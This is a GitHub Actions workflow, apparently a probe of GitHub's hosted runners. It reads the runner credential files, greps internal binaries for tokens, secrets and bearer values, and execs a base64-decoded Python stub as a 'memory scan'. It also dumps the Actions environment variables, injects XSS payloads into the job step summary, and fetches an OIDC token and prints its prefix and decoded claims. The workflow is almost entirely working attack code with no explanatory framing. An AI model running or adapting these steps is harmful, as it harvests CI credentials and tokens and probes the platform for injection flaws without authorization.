name: ProcProbe
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Deep runner investigation
        run: |
          echo PPID=$PPID
          echo === PIPELINE FOLDER ===
          cat /home/runner/work/_PipelineMapping/*/PipelineFolder.json 2>/dev/null || echo not-found
          echo === RUNNER TEMP FILES ===
          find /home/runner/work/_temp/ -type f 2>/dev/null | head -20
          echo === RUNNER CONFIG ===
          cat /home/runner/actions-runner/.runner 2>/dev/null || echo not-found
          cat /home/runner/actions-runner/.credentials 2>/dev/null || echo not-found
          echo === PROVJOBD ===
          ls -la /tmp/provjobd* 2>/dev/null || echo no-provjobd
          strings /tmp/provjobd* 2>/dev/null | grep -iE 'token|secret|runtime|cache|bearer' | head -30 || echo no-matches
          echo === HCA ===
          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE 'ACTIONS_RUNTIME|bearer' | head -20 || echo no-matches
          echo === MEMORY SCAN ===
          python3 -c "import base64; exec(base64.b64decode('').decode())"
          echo === ALL ACTIONS/GITHUB ENV VARS ===
          env | grep -iE 'ACTIONS|GITHUB|RUNNER' | sort
      - name: Step Summary XSS Test
        run: |
          echo '<img src=x onerror=alert(document.domain)>' >> $GITHUB_STEP_SUMMARY
          echo '<svg/onload=alert(1)>' >> $GITHUB_STEP_SUMMARY
          echo '<script>alert(1)</script>' >> $GITHUB_STEP_SUMMARY
          echo done
      - name: OIDC claims dump
        run: |
          T=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com" | python3 -c "import json,sys; print(json.load(sys.stdin).get('value','ERR'))")
          echo TOKEN_PREFIX=${T:0:30}
          echo $T | cut -d. -f2 | python3 -c "import sys,base64,json; b=sys.stdin.read().strip(); b+='='*(-len(b)%4); [print(f'{k}: {v}') for k,v in sorted(json.loads(base64.b64decode(b)).items())]"
